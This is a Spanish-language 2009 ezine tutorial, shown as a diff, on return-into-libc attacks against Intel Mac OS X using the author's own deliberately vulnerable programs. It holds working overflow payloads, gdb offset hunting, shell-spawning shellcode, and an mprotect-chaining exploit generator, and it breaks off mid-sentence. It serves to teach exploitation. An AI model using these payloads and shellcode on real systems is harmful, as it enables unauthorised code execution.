@@ -1,0 +1,958 @@
+-[ 0x04 ]--------------------------------------------------------------------
+-[ Return Into to Libc en MacOS X ]------------------------------------------
+-[ by blackngel ]----------------------------------------------------SET-38--
+
+
+          ^^
+      *`* @@ *`*     HACK THE WORLD
+     *   *--*   *    
+          ##         <blackngel1@gmail.com>
+          ||         <black@set-ezine.org>
+         *  *
+        *    *       (C) Copyleft 2009 everybody
+       _*    *_
+
+
+1 - Introduccion
+
+2 - Ret2libc con system( )
+
+3 - Ret2libc en el Heap
+
+4 - Experimentos con mprotect( )
+
+5 - Conclusion
+
+6 - Referencias
+
+
+
+---[ 1 - Introducion
+
+Por que hablar nuevamente sobre tecnicas Return Into To Libc? No son acaso
+estas comunes a todos los sistemas? El motivo en si, es la respuesta a esta
+segunda pregunta. La base del ataque tiene la misma forma, pero las condiciones
+son distintas.
+
+Mac OS X, a pesar de su fama entre la gente comun de poseer un bajo numero de
+vulnerabilidades o fallos de seguridad, es uno de los sistemas operativos que
+mas atras se ha quedado en lo que a mecanismos de proteccion se refiere. Para
+empezar no implementa ninguna clase de aleatorizacion de direcciones de memoria
+(ASLR), algo muy presente en las actuales distribuciones de Linux. Tampoco
+los compiladores agregan protecciones tipo Stack-Guard o Stack-Shield u otras
+basadas en cookies que detecten la modificacion de registros del sistema.
+
+Que la gente no se dedique a estudiar todos los problemas reales de Mac OS X,
+no quiere decir de ninguna manera que los fallos no existan, y dejarlos ahi por
+mucho tiempo significa hacerle un flaco favor al sistema y a los usuarios que
+se ven a merced de los atacantes sin escrupulos y las tardias y reprochadas
+mega-actualizaciones que Apple suele proporcionar.
+
+No obstante todo lo dicho, hay algo que nuestros amigos de Apple si han
+implementando en las versiones de sus sistemas operativos que en la actualidad
+corren bajo la plataforma Intel x86, y es el hecho de establecer los permisos
+de las paginas pertenecientes a la pila (stack) como NO ejecutables.
+
+Esto limita la aplicacion de clasicos exploits relativos a buffer overflows que
+intentan ejecutar codigo arbitrario contenido en el stack. Si, claro, por eso
+estamos aqui, porque Return Into To Libc puede solucionar esos problemas. Vale,
+lograr ejecutar una llamada a system( ) puede proporcionarte una shell directa
+pero... en primer lugar, aqui descubriremos que algunas dificultades pueden ser
+encontradas en el camino, y dos, un hacker que se precie casi siempre apreciara
+la posibilidad de ejecutar codigo de su propia eleccion.
+
+Bien... la cuestion es: como hacer esto ultimo si cualquier codigo alojado en
+la pila no podra ser ejecutado? Veremos aqui las posibilidades de introducir
+nuestra shellcode en el espacio del Heap y bifurcar a esa direccion el flujo
+de ejecucion del programa vulnerable.
+
+Para terminar, nos adentraremos en una tecnica muy vagamente documentada, que
+tiene como objetivo devolverle a la Pila sus permisos de ejecucion originales
+y evitar asi el uso o abuso del Heap. He tenido algunos problemas con el
+desarrollo de la misma, de modo que presento aqui los resultados con el fin
+de que alguien pueda encontrar la solucion definitiva.
+
+
+NOTA: En la seccion "Referencias" podras encontrar una buena recopilacion
+      de enlaces relativos a temas de explotacion en entornos MAC (ya sea
+      sobre plataformas Intel o PPC).
+
+
+
+---[ 2 - Ret2libc con system()
+
+Tomemos como ejemplo el programa vulnerable mas simple:
+
+[- vuln.c -]
+
+#include <stdio.h>
+#include <string.h>
+
+int main(int argc, char *argv[])
+{
+   char buff[32];
+
+   if (argc > 1) {
+      strcpy(buff, argv[1]);
+   }
+
+   return 0;
+}
+
+[- end vuln.c -]
+
+De acuerdo, como siempre, no tiene misterio. Busquemos en que offset el
+programa rompe, y donde sobreescribimos exactamente EIP:
+
+ooooo
+
+mac:~ blackngel$ gdb -q ./vuln
+Reading symbols for shared libraries .. done
+(gdb) run `perl -e 'print "A" x 40 . "bbbb" . "cccc" . "dddd";'`
+Starting program: /Users/blackngel/vuln `perl -e 'print "A" x 40 . "bbbb" .
+"cccc" . "dddd";'`
+Reading symbols for shared libraries . done
+
+Program received signal EXC_BAD_ACCESS, Could not access memory.
+Reason: KERN_INVALID_ADDRESS at address: 0x63636363
+0x63636363 in ?? ()
+
+Bien, entonces hemos alterado EIP con "cccc", lo cual significa que precisamos
+un padding de 44 bytes antes de golpear en el punto correto. Ahora... donde
+esta system( ) ?
+
+(gdb) p system
+$1 = {<text variable, no debug info>} 0x90046c20 <system>
+
+ooooo
+
+Correcto, no olvidemos entonces ahora que nuestro buffer de ataque deberia
+tener una estructura como la siguiente:
+
+   [ PADDING (44 bytes) ][ &system() ][4 bytes basura o ret ][ &"/bin/sh"]
+
+En primer lugar, es decision tuya si deseas incluir 4 bytes cualesquiera tras
+la direccion de la funcion system() u otra direccion que te permita controlar
+nuevamente el flujo de ejecucion del programa o al menos salir silencisosamente
+llamando a exit( ).
+
+La segunda cuestion radica en donde situar realmente la cadena "/bin/sh" y
+obtener su direccion. Utilizar una variable de entorno es como siempre una de
+las posibles opciones, pero no hay nada mas comodo que situarla en el mismo
+argumento pasado al programa.
+
+No obstante, veamos antes de nada si la pila es sobreescrita correctamente
+con los datos que tenemos hasta el momento:
+
+ooooo
+
+(gdb) disass main 
+Dump of assembler code for function main:
+0x00001f8a <main+0>:    push   %ebp
+0x00001f8b <main+1>:    mov    %esp,%ebp
+0x00001f8d <main+3>:    sub    $0x38,%esp
+0x00001f90 <main+6>:    cmpl   $0x1,8(%ebp)
+0x00001f94 <main+10>:   jle    0x1fad <main+35>
+0x00001f96 <main+12>:   mov    12(%ebp),%eax
+0x00001f99 <main+15>:   add    $0x4,%eax
+0x00001f9c <main+18>:   mov    (%eax),%eax
+0x00001f9e <main+20>:   mov    %eax,4(%esp)
+0x00001fa2 <main+24>:   lea    -40(%ebp),%eax
+0x00001fa5 <main+27>:   mov    %eax,(%esp)
+0x00001fa8 <main+30>:   call   0x301b <dyld_stub_strcpy>
+0x00001fad <main+35>:   mov    $0x0,%eax
+0x00001fb2 <main+40>:   leave  
+0x00001fb3 <main+41>:   ret    
+End of assembler dump.
+(gdb) break *main+35
+Breakpoint 1 at 0x1fad
+(gdb) run `perl -e 'print "A" x 44 . "\x20\x6c\x04\x90" . "AAAA" . "BBBB";'`
+Starting program: /Users/blackngel/vuln `perl -e 'print "A" x 44 .
+"\x20\x6c\x04\x90" . "AAAA" . "BBBB";'`
+Reading symbols for shared libraries . done
+
+Breakpoint 1, 0x00001fad in main ()
+(gdb) x/4x $ebp
+0xbffffbe8:     0x41414141      0x00001f00      0x00000003      0xbffffc48
+
+ooooo
+
+Mmmm... muy sospechoso, sobreescribimos EBP, pero no asi EIP. Que ocurre?
+Como he dicho al principio de este articulo, algunas dificultades pueden ser
+encontradas. Resulta ser en este caso que el caracter "\x20" no es admitido,
+tal como si de "\x00" se tratase y corta nuestra cadena de ataque.
+
+Como solucionar esto? Podriamos utilizar una direccion posterior a &system() ?
+
+(gdb) x/6i system
+0x90046c20 <system>:    push   %ebp
+0x90046c21 <system+1>:  mov    %esp,%ebp
+0x90046c23 <system+3>:  push   %edi
+0x90046c24 <system+4>:  push   %esi
+0x90046c25 <system+5>:  push   %ebx
+0x90046c26 <system+6>:  sub    $0x6c,%esp
+
+Piensa que saltarse el prologo de funcion no es ni por asomo buena idea, mas
+que nada porque el direccionamiento de toda variable local quedara corrompido,
+y vemos por la sentencia "sub    $0x6c,%esp" que en efecto estas son utilizadas.
+Y detras ?
+
+(gdb) x/4i system - 2
+0x90046c1e <mach_msg_destroy+924>:      nop    
+0x90046c1f <mach_msg_destroy+925>:      nop    
+0x90046c20 <system>:    push   %ebp
+0x90046c21 <system+1>:  mov    %esp,%ebp
+
+Bingo! No podiamos haber tenido mejor suerte, instrucciones NOP dispuestas a
+no hacer nada, pero que al tiempo nos facilitan una direccion que no destruye
+nuestro buffer de ataque ("0x90946c1f"). Comprueba tu mismo que ahora EIP se
+sobreescribe correctamente.
+
+Otro dato importante que seria interesante conocer es la direccion del comiendo
+de nuestro buffer, en este caso:
+
+(gdb) x/16x $ebp-40
+0xbffffbc0:     0x41414141      0x41414141      0x41414141      0x41414141
+
+Es decir: 0xbffffbc0
+
+Con ello alguno podria pensar rapidamente en poner la cadena "/bin/sh" al
+comienzo del buffer, e indicar su direccion en el lugar adecuado. Probemos:
+
+ooooo
+
+(gdb) run `perl -e 'print "/bin/sh" . "A" x 37 . "\x1f\x6c\x04\x90" . "BBBB" .
+"\xc0\xfb\xff\xbf";'`
+.....
+Program received signal EXC_BAD_ACCESS, Could not access memory.
+Reason: KERN_INVALID_ADDRESS at address: 0x42424242
+0x42424242 in ?? ()
+
+ooooo
+
+Bien, lo que pasa es lo siguiente, system( ) espera como argumento una cadena
+"null-terminated", lo cual no podemos ni hacer ni garantizar desde que un nulo
+rompera el buffer de ataque, es por ello que la llamada simplemente falla y
+tras el retorno intenta ejecutar la siguiente instruccion cuya direccion es
+indicada por "BBBB" (exactamente 0x42424242). La solucion pasa entonces por
+colocar "/bin/sh" justo al final de nuestra cadena:
+
+ooooo
+
+(gdb) x/s 0xbffffbe5
+0xbffffbe5:      "???/bin/sh"
+(gdb) x/s 0xbffffbe8
+0xbffffbe8:      "/bin/sh"
+(gdb) run `perl -e 'print "A" x 44'``perl -e 'print "\x1f\x6c\x04\x90VVVV\xe8
+\xfb\xff\xbf/bin/sh"'`
+The program being debugged has been started already.
+
+Breakpoint 1, 0x00001fad in main ()
+(gdb) c
+Continuing.
+sh-2.05b$
+
+ooooo
+
+Como hemos podido ver, algunas trampas pueden ser encontradas en el proceso,
+pero todas son facilmente sorteables.
+
+
+
+---[ 3 - Ret2libc con el Heap
+
+Una vez logrado nuestro principal objetivo, ahora tocar jugar mas fuerte y
+buscar un mayor control sobre la explotacion.
+
+Bien, habiamos dicho que si nuestra intencion es la de ejecutar codigo
+arbitrario real, dado que la pila no es ya un entorno ejecutable, nuestra
+shellcode deberia estar en el Heap. Tal vez consigas hayar un programa
+vulnerable tal que reserve un buffer mediante alguna llamada como malloc( ),
+calloc( ), o realloc( ), en el cual tengas la posibilidad de introducir datos.
+
+Pero que pasa cuando esto no es asi?
+
+Ya que podemos introducir datos en el stack, tal vez podamos hacer uso de
+ret2libc con el objetivo de llamar a una funcion de transferencia de datos
+(sea strcpy( ), strncpy( ) o strlcpy( )), y lograr mover una shellcode
+originalmente situada en la pila, al espacio Heap.
+
+En el caso de Mac OS X existe un ligero problema:
+
+(gdb) p strcpy
+$5 = {<text variable, no debug info>} 0x90002160 <strcpy>
+(gdb) p strncpy
+$6 = {<text variable, no debug info>} 0x90009f40 <strncpy>
+(gdb) p strlcpy
+$7 = {<text variable, no debug info>} 0x90033520 <strlcpy>
+
+Es sencillo observar como solo "strlcpy( )" servira a nuestros propositos, las
+otras dos funciones, de uso mas general, estan situadas en una posicion de la
+memoria tal que sus direcciones contienen un byte null "\x00". Utilizaremos por
+tanto la ultima en el ataque.
+
+Una rapida ayuda de "man" nos indica el prototipo de la susodicha funcion:
+
+ooooo
+
+SYNOPSIS
+     #include <string.h>
+
+     size_t
+     strlcpy(char *dst, const char *src, size_t size);
+
+ooooo
+
+La unica diferencia es que esta funcion requiere de un parametro o argumento
+adicional indicando el numero maximo de bytes a ser copiados desde "src" a
+"dst". Si colocamos nuestra shellcode como ultimo eslabon de la cadena,
+necesitamos que este valor size no contenga bytes null, y por otro lado, que
+no sea demasiado grande como para leer alguna pagina de la memoria no mapeada.
+Por lo comun es normal utilizar el valor mas peque~o sin contener bytes null,
+que es: "0x01010101".
+
+Sabemos entonces que:
+
+1 -> Debemos sobreescribir EIP con la direccion de strlcpy( ).
+2 -> "src" debe ser una direccion en el stack apuntando al shellcode.
+3 -> "dst" debe ser una direccion en el heap donde se copiara el shellcode.
+4 -> "size" debe ser el valor minimo sin bytes null: 0x01010101.
+
+OK, entonces, parece que lo unico que nos falta por saber es la direccion
+de destino donde nuestro shellcode sera copiado. Dado que necesitamos una
+direccion valida en el Heap, podemos utilizar el siguiente programa para
+descubrir donde se encuentra la zona principal de memoria, y donde malloc( )
+reserva los trozos segun su tama~o:
+
+[- mzones.c -]
+
+        #include <stdio.h>
+        #include <stdlib.h>
+
+        int main(int ac, char **av)
+        {
+                extern *malloc_zones;
+
+                printf("initial_malloc_zones @ 0x%x\n", *malloc_zones);
+                printf("tiny:  0x%08x\n", malloc(22));
+                printf("small: 0x%08x\n", malloc(500));
+                printf("large: 0x%08x\n", malloc(0xffffffff));
+                return 0;
+        }
+
+[- mzones.c -]
+
+mac:~ blackngel$ ./mzones
+initial_malloc_zones @ 0x1800000
+tiny:  0x00300130
+small: 0x01800600
+large: 0x00000000
+
+Parece que lo mas estable es utilizar algo por encima de "0x01800000", pero
+recuerda nuevamente evitar bytes null. Siguiendo con la regla del valor minimo,
+podemos usar "0x01800601" o algo por el estilo. Esta misma direccion sera
+utilizada como "ret" justo despues de la direccion de la funcion strlcpy(), ya
+que es ahi exactamente donde debe continuar la ejecucion del programa.
+
+Y ya para finalizar con los preparativos, necesitamos una shellcode apropiada
+para Mac OS X y la arquitectura Intel x86. Mostramos aqui un ejemplo efectivo,
+aunque no sera discutido su desarrollo:
+
+"\xeb\x07\x33\xc0\x50\x40\x50\xcd\x80\x33\xc0\x50\x50\xb0\x17\xcd\x80\x5 
+8\x40\x40\xcd\x80\x5b\x50\x53\x53\x53\x50\x33\xc0\xb0\x07\x50\xcd\x80\x5 
+b\x5b\x3b\xd8\x74\xd9\x33\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6 
+e\x8b\xdc\x50\x54\x54\x53\xb0\x3b\x50\xcd\x80"
+
+Otro peque~o problema que ya vimos en la seccion anterior, es que tenemos
+la desgracia de contrarnos con un byte "\x20" en la direccion de la funcion
+strlcpy( ). Esto puede ser solventado nuevamente del mismo modo que la vez
+anterior, terminando dicha direccion en "\x1f", en cuya direccion se encuentra
+una instruccion NOP perteneciente a la funcion setgid( ):
+
+(gdb) x/3i strlcpy - 2
+0x9003351e <setgid+30>: nop    
+0x9003351f <setgid+31>: nop    
+0x90033520 <strlcpy>:   push   %ebp
+
+Ya con todo el material sobre la mesa, juntemos las piezas del puzzle:
+
+   [PAD 44][&strlcpy()][&sc heap][&sc heap][&sc stack][size][shellcode]
+
+   [PAD 44][0x9003351f][0x01800601][0x01800601][0xbffffb70][0x01010101][sc]
+
+NOTA: La direccion exacta de nuestra shellcode en la pila fue hayada con GDB.
+
+Vamos a ver el efecto de nuestro exploit en la linea de comandos:
+
+ooooo
+
+(gdb) run `perl -e 'print "A" x 44 . "\x1f\x35\x03\x90" . "\x01\x06\x80\x01" .
+"\x01\x06\x80\x01" . "\x70\xfb\xff\xbf" . "\x01\x01\x01\x01" . "\xeb\x07\x33
+\xc0\x50\x40\x50\xcd\x80\x33\xc0\x50\x50\xb0\x17\xcd\x80\x58\x40\x40\xcd\x80
+\x5b\x50\x53\x53\x53\x50\x33\xc0\xb0\x07\x50\xcd\x80\x5b\x5b\x3b\xd8\x74\xd9
+\x33\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x8b\xdc\x50\x54\x54\x53
+\xb0\x3b\x50\xcd\x80";'`
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+.....
+
+Breakpoint 2, 0x00001fad in main ()
+(gdb) c
+Continuing.
+mac:/Users/blackngel blackngel$ id
+uid=501(blackngel) gid=501(blackngel) groups=501(blackngel), 31(boinc_project),
+81(appserveradm), 79(appserverusr), 80(admin), 30(boinc_master)
+mac:/Users/blackngel blackngel$ exit
+exit
+
+Program exited normally.
+(gdb) 
+
+ooooo
+
+Genial! Esta shellcode ejecutaba "/bin/bash", lo digo para los que esperaban
+el prompot de sh.
+
+Hemos ido como siempre por el camino "complicado?", ya que si alguno hubiera
+pensando en funciones como strcat( ) o strncat( ), la vida hubiera sido un
+poco mas facil. Basta solo con sustituir la direccion de strlcpy( ) por la de
+strcat( ), eliminar el parametro "size" y restar 4 a la direccion del shellcode
+en el stack.
+
+ooooo
+
+(gdb) p strcat
+$9 = {<text variable, no debug info>} 0x9001c3d0 <strcat>
+(gdb) p strncat
+$10 = {<text variable, no debug info>} 0x900291b0 <strncat>
+
+(gdb) run `perl -e 'print "A" x 44 . "\xd0\xc3\x01\x90" . "\x01\x06\x80\x01" .
+"\x01\x06\x80\x01" . "\x6c\xfb\xff\xbf" . "\xeb\x07\x33\xc0\x50\x40\x50\xcd\x80
+\x33\xc0\x50\x50\xb0\x17\xcd\x80\x58\x40\x40\xcd\x80\x5b\x50\x53\x53\x53\x50\x33
+\xc0\xb0\x07\x50\xcd\x80\x5b\x5b\x3b\xd8\x74\xd9\x33\xc0\x50\x68\x2f\x2f\x73\x68
+\x68\x2f\x62\x69\x6e\x8b\xdc\x50\x54\x54\x53\xb0\x3b\x50\xcd\x80";'`
+The program being debugged has been started already.
+.....
+Breakpoint 2, 0x00001fad in main ()
+(gdb) c
+Continuing.
+mac:/Users/blackngel blackngel$ id
+uid=501(blackngel) gid=501(blackngel) groups=501(blackngel), 31(boinc_project),
+81(appserveradm), 79(appserverusr), 80(admin), 30(boinc_master)
+mac:/Users/blackngel blackngel$ exit
+exit
+
+Program exited normally.
+
+ooooo
+
+Siempre hay varias posibilidades para resolver un mismo problema, el problema
+mas dificil es encontrar esas posibilidades ;)
+
+
+
+---[ 4 - Experimentos con mprotect( )
+
+En este capitulo voy a comentar y demostrar la problematica encontrada al
+intentar aplicar Return Into To Libc llamando a la funcion mprotect( ) con
+el objetivo de devolverle los permisos de ejecucion al stack.
+
+Veamos antes de nada que dice "man" al respecto de esta funcion tan venerada:
+
+ooooo
+
+SYNOPSIS
+     #include <sys/types.h>
+     #include <sys/mman.h>
+
+     int
+     mprotect(caddr_t addr, size_t len, int prot);
+
+DESCRIPTION
+     The mprotect() system call changes the specified pages to have protection
+     prot.  Not all implementations will guarantee protection on a page basis;
+     the granularity of protection changes may be as large as an entire
+     region.
+
+ooooo
+
+Como podemos ver, el prototipo de funcion es sencillo. El primer argumento
+indica la direccion en memoria a partir de la cual van a ser cambiados o
+establecidos los permisos. El segundo indica la longitud (en bytes) de las
+paginas a modificar. Y por el ultimo parametro establece que tipo de proteccion
+sera aplicada: lectura, escritura, ejecucion, o una mezcla de las tres (or |).
+
+#define	PROT_NONE	0x00	/* [MC2] no permissions         --- */
+#define	PROT_READ	0x01	/* [MC2] pages can be read      r-- */
+#define	PROT_WRITE	0x02	/* [MC2] pages can be written   -w- */
+#define	PROT_EXEC	0x04	/* [MC2] pages can be executed  --x */
+
+Pero claramente tenemos un problema (en realidad dos). Resulta que tanto la
+longitud como la proteccion son y deberan ser valores relativamente peque~os,
+esto es que a la hora de introducirlos via un buffer de ataque, contrendran
+irremediablemente bytes NULL. Una funcion como strcpy( ) no permitiria esto,
+de modo que en principio vamos a plantear una variacion del programa:
+
+[- vuln2.c -]
+
+#include <stdio.h>
+#include <string.h>
+
+#define BSIZE 32
+#define BUFFSIZE 256
+
+int main(int argc, char *argv[])
+{
+   char buff[BSIZE];
+
+   fread(buff, BUFFSIZE, 1, stdin); // Oops!
+
+   return 0;
+}
+
+[- end vuln2.c -]
+
+Y seguidamente, muestro aqui un programa que demuestra el uso de mprotect( ).
+Fijate que utilizamos un puntero de funcion al que le asignamos la direccion
+de la shellcode y que es llamado dos veces a lo largo del programa.
+
+En un entorno con stack ejecutable, la primera llamada a func( ) desplegaria
+inmediatamente una shell. No ocurre asi en Mac, en el que un error sera emitido
+(lo comprobaremos con GDB). Veamos:
+
+[- mprot.c -]
+
+#include <stdio.h>
+#include <sys/mman.h>
+
+int main(int argc, char *argv[])
+{
+   int ret;
+   char shellcode[ ] =
+  "\xeb\x07\x33\xc0\x50\x40\x50\xcd\x80\x33\xc0\x50\x50\xb0\x17\xcd\x80\x58\x40"
+  "\x40\xcd\x80\x5b\x50\x53\x53\x53\x50\x33\xc0\xb0\x07\x50\xcd\x80\x5b\x5b\x3b"
+  "\xd8\x74\xd9\x33\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x8b\xdc\x50"
+  "\x54\x54\x53\xb0\x3b\x50\xcd\x80";
+
+   void (*func)(void);
+
+   func = (void *)shellcode;
+
+   func(); // (1)
+
+   ret = mprotect((void *)0xbffff001, 4000, PROT_READ|PROT_WRITE|PROT_EXEC);
+
+   printf("\nRET = [ %d ]\n", ret);
+   
+   func(); // (2)
+
+   return 0;
+}
+
+[- end mprot.c -]
+
+Comprobemos que pasa si ejecutamos esta pequeÃ±a prueba de concepto tal y como
+esta:
+
+ooooo
+
+mac:~ blackngel$ ./mprot
+Bus error
+mac:~ blackngel$ gdb -q ./mprot
+Reading symbols for shared libraries .. done
+(gdb) run
+Starting program: /Users/blackngel/mprot 
+Reading symbols for shared libraries . done
+
+Program received signal EXC_BAD_ACCESS, Could not access memory.
+Reason: KERN_PROTECTION_FAILURE at address: 0xbffffc06
+0xbffffc06 in ?? ()
+(gdb)
+
+ooooo
+
+Lo que nos temiamos (o no), la proteccion ha funcionado correctamente y la
+se~al de error nos informa con el mensaje "KERN_PROTECTION_FAILURE" que hemos
+intentado ejecutar codigo en una zona no permitida, exactamente el principio
+del buffer shellcode (0xbffffc06).
+
+Pero... que ocurre ahora si comentamos la primera llamada a func( ) y dejamos
+que mprotect( ) haga su trabajo antes de que sea nuevamente ejecutada?
+
+ooooo
+
+mac:~ blackngel$ ./mprot
+
+RET = [ 0 ]
+mac:/Users/blackngel blackngel$ id
+uid=501(blackngel) gid=501(blackngel) groups=501(blackngel), 31(boinc_project),
+81(appserveradm), 79(appserverusr), 80(admin), 30(boinc_master)
+mac:/Users/blackngel blackngel$ exit
+exit
+mac:~ blackngel$ 
+
+ooooo
+
+Premio! Obtenemos una shell como recompensa, y vemos tambien el valor de
+retorno de la funcion mprotect( ). Un valor de "-1" hubiera significado un
+error en la llamada.
+
+Conocemos entonces los siguientes datos:
+
+   &mprotect( )  -> 0x90088d1d  -> "\x1d\x8d\x08\x90"
+   addr          -> 0xbffff001  -> "\x01\xf0\xff\xbf"
+   len           -> 4000        -> "\xa0\x0f\x00\x00"
+   prot          -> 7           -> "\x07\x00\x00\x00"
+
+... pero los problemas comienzan cuando intentamos traslar estos mismos
+valores al programa vulnerable. Para realizar el ataque debemos crear
+un exploit que a su vez cree un fichero con el buffer a introducir. Este
+fichero sera redireccionado al programa vulnerable mediante la entrada
+estandar ( $ ./vuln2 < fichero ), desencadenando asi el fallo en la
+funcion de entrada fread( ).
+
+[- boom.c -]
+
+#include <stdio.h>
+#include <string.h>
+
+int main(int argc, char *argv[])
+{
+   int i;
+   char shellcode[ ] =
+  "\xeb\x07\x33\xc0\x50\x40\x50\xcd\x80\x33\xc0\x50\x50\xb0\x17\xcd\x80\x58\x40"
+  "\x40\xcd\x80\x5b\x50\x53\x53\x53\x50\x33\xc0\xb0\x07\x50\xcd\x80\x5b\x5b\x3b"
+  "\xd8\x74\xd9\x33\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x8b\xdc\x50"
+  "\x54\x54\x53\xb0\x3b\x50\xcd\x80";
+
+   for (i = 0; i < 44/4; i++)
+     fwrite("\x41\x41\x41\x41", 4, 1, stdout); // PADDING
+
+   fwrite("\x1d\x8d\x08\x90", 4, 1, stdout);   // &mprotect( )
+   fwrite("\x70\xfc\xff\xbf", 4, 1, stdout);   // ret -> &shellcode
+   fwrite("\x00\xf0\xff\xbf", 4, 1, stdout);   // addr (arg 1)
+   fwrite("\xa0\x0f\x00\x00", 4, 1, stdout);   // len  (arg 2)
+   fwrite("\x07\x00\x00\x00", 4, 1, stdout);   // prot (arg 3)
+   fwrite(shellcode, strlen(shellcode)+1, 1, stdout); // Shellcode
+
+   return 0;
+}
+
+[- end boom.c -]
+
+Pero al realizar la prueba...
+
+ooooo
+
+mac:~ blackngel$ gcc boom.c -o boom
+mac:~ blackngel$ ./boom > bam
+mac:~ blackngel$ ./vuln2 < bam
+Bus error
+mac:~ blackngel$ 
+
+ooooo
+
+Lo mas raro de todo es cuando hacemos uso de GDB para ver que es lo que
+ha ocurrido:
+
+ooooo
+
+mac:~ blackngel$ gdb -q ./vuln2
+Reading symbols for shared libraries .. done
+(gdb) run < bam
+Starting program: /Users/blackngel/vuln2 < bam
+Reading symbols for shared libraries . done
+
+Program exited normally.
+(gdb)
+
+ooooo
+
+Es decir, que el programa no rompe, pero tampoco ejecuta una nueva shell
+de comandos. 
+
+Como sabemos que mprotect( ) se ejecuta correctamente?
+
+Podemos comprobarlo de dos formas distintas. La primera es modificar el
+argumento "len" en boom.c provocando manualmente el fallo de esta llamada.
+Un error comun podria haber sido intentar introducir el valor 4000 sin
+pasarlo a hexadecimal, cambia esto:
+
+   fwrite("\xa0\x0f\x00\x00", 4, 1, stdout);
+
+por esto:
+
+   fwrite("\x00\x40\x00\x00", 4, 1, stdout);
+
+Si despues de crear el nuevo archivo "bam", ejecutamos "./vuln2" en el
+depurador, el resultado seria este:
+
+ooooo
+
+(gdb) run < bam
+Starting program: /Users/blackngel/vuln2 < bam
+Reading symbols for shared libraries . done
+
+Program received signal EXC_BAD_ACCESS, Could not access memory.
+Reason: KERN_PROTECTION_FAILURE at address: 0xbffffc70
+0xbffffc70 in ?? ()
+
+ooooo
+
+Esto demuestra que anteriormente habiamos cambiado la proteccion de la
+pila, pero que en este caso ocurre lo contrario porque mprotect( ) ha
+fallado.
+
+La otra forma es simplemente colocando un break en mprotect( ) y trazando
+las subsiguientes llamadas. En el primer caso (el correcto), pintaria asi:
+
+ooooo
+
+(gdb) break *mprotect
+Breakpoint 1 at 0x90088d1d
+(gdb) run < bam
+Starting program: /Users/blackngel/vuln2 < bam
+Reading symbols for shared libraries . done
+
+Breakpoint 1, 0x90088d1d in mprotect ()
+(gdb) next
+Single stepping until exit from function mprotect, 
+which has no line number information.
+0xa0011145 in dyld_stub_getpagesize ()
+(gdb) 
+.....
+0x90015160 in getpagesize ()
+(gdb) 
+.....
+0x9016a980 in __i686.get_pc_thunk.bx ()
+(gdb) 
+.....
+0x9001516c in getpagesize ()
+(gdb) 
+.....
+0x90088d2c in mprotect ()
+(gdb) 
+.....
+0xa0011000 in dyld_stub_syscall ()
+(gdb) 
+.....
+0x90004d40 in syscall ()
+(gdb) 
+.....
+0x90088d55 in mprotect ()
+(gdb) 
+.....
+0xbffffc70 in ?? ()
+(gdb) 
+Cannot find bounds of current function
+(gdb) c
+Continuing.
+
+Program exited normally. 
+
+ooooo
+
+En el caso erroneo, por el contrario, observariamos el siguiente error:
+
+ooooo
+
+(gdb) break *mprotect
+Breakpoint 1 at 0x90088d1d
+(gdb) run < bam
+Starting program: /Users/blackngel/vuln2 < bam
+Reading symbols for shared libraries . done
+
+Breakpoint 1, 0x90088d1d in mprotect ()
+(gdb) next
+Single stepping until exit from function mprotect, 
+which has no line number information.
+0xa0011145 in dyld_stub_getpagesize ()
+(gdb) 
+.....
+0x90015160 in getpagesize ()
+(gdb) 
+.....
+0x9016a980 in __i686.get_pc_thunk.bx ()
+(gdb) 
+.....
+0x9001516c in getpagesize ()
+(gdb) 
+.....
+0x90088d2c in mprotect ()
+(gdb) 
+.....
+0xa0011000 in dyld_stub_syscall ()
+(gdb) 
+.....
+0x90004d40 in syscall ()
+(gdb) 
+.....
+0x90110770 in cerror ()
+(gdb) 
+.....
+0x90001255 in cthread_set_errno_self ()
+(gdb) 
+.....
+0x9016a980 in __i686.get_pc_thunk.bx ()
+(gdb) 
+.....
+0x90001263 in cthread_set_errno_self ()
+(gdb) 
+.....
+0x9011079b in cerror ()
+(gdb) 
+.....
+0x90088d55 in mprotect ()
+(gdb) 
+.....
+0xa0011041 in dyld_stub___error ()
+(gdb) 
+.....
+0x900012b0 in __error ()
+(gdb) 
+.....
+0x9016a984 in __i686.get_pc_thunk.cx ()
+(gdb) 
+.....
+0x900012b8 in __error ()
+(gdb) 
+.....
+0x90088d61 in mprotect ()
+(gdb) 
+.....
+0xa0011041 in dyld_stub___error ()
+(gdb) 
+.....
+0x900012b0 in __error ()
+(gdb) 
+.....
+0x9016a984 in __i686.get_pc_thunk.cx ()
+(gdb) 
+.....
+0x900012b8 in __error ()
+(gdb) 
+.....
+0x90088d6b in mprotect ()
+(gdb) 
+.....
+0xbffffc70 in ?? ()
+(gdb) 
+Cannot find bounds of current function
+(gdb) c
+Continuing.
+
+Program received signal EXC_BAD_ACCESS, Could not access memory.
+Reason: KERN_PROTECTION_FAILURE at address: 0xbffffc70
+0xbffffc70 in ?? ()
+
+ooooo
+
+En mi humilde opinion, y a pesar de haber hecho una infinidad de pruebas
+con multiples variaciones, sigo pensando que el problema reside en la
+shellcode, no por ella en si misma, sino por las dificultades que plantea
+su ejecucion en MAC.
+
+Una de ellas es por ejemplo que las llamadas a execve( ) fallan si el
+programa que lo ejecuta posee multiples hilos. Para solucionar este problema,
+las shellcodes deben hacer una llamada a fork( ), de modo que el nuevo
+proceso hijo tenga un hilo unico (el mismo), y execve( ) pueda ejecutarse
+correctamente. Ademas, el proceso padre deberia llamar a wait4( ) con el fin
+de que este no finalize antes de que el hijo haya realizado su trabajo.
+Puedes revisar el archivo <sys/syscall.h> para comprobar que las llamadas
+wait( ), wait3( ) o waitpid( ) se encuentran en desuso.
+
+La shellcode utilizada posee todas estas caracteristicas, pero algo que
+escapa a mi control parece echarlo todo finalmente a perder. He escrito
+esta seccion con el animo de que aquellos que deseen experimentar y den
+finalmente con la solucion, me lo hagan saber.
+
+Solo comentar, para terminar, que si modifico la shellcode del programa
+"mprot.c" por la siguiente:
+
+   char shellcode[ ] = "\x33\xc0\x50\x68\x2f\x2f\x73\x68"
+                       "\x68\x2f\x62\x69\x6e\x8b\xdc\x50"
+                       "\x54\x54\x53\xb0\x3b\x50\xcd\x80";
+
+... que es la misma que la original, pero eliminando el codigo principal,
+y las llamadas a setuid(0), fork( ) y wait4( ) (solo dejamos la llamada
